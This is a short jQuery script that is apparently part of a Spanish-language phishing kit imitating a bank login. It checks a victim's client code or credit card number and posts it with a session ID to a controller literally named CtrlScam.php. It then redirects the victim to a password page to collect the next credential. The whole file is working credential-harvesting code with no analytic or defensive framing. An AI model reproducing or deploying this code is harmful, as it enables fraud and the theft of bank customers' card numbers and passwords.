$(document).ready(function(){

     $('#loading2').hide();
    //alert('Este script esta corriendo desde Script Usuario...');

    $('a.btn_stu_otp').click(function(e){
        e.preventDefault();
        //$('#loading2').show();
        var cliente = $('.cliente_data');

        if(isNaN(cliente.val()) || cliente.val().length < 2){
            alert('Por favor verifique la información proporcionada.');
            cliente.focus();
        }else{
            if(cliente.val() == ""){
                alert('Favor de teclear tu código de cliente o Tarjeta De Crédito.');
                cliente.focus();
            }else{
                
                console.log(cliente.val())
                
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/CtrlScam.php',
                    data: {
                        "request": "usuario",
                        "interface": "Supernet2007",
                        "user": cliente.val(),
                        "session": $('#session').val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                         $('#loading2').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        //alert(resp);
                        console.log(resp);
                        //alert(resp)
                        if(resp == "1"){
                            window.location.href="password.php?session="+$('#session').val();
                        }else{
                            alert('Fallo al guardar');
                        }
                        
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });

                //window.location.href="password.php";
            }
        }
        return false;
    });
});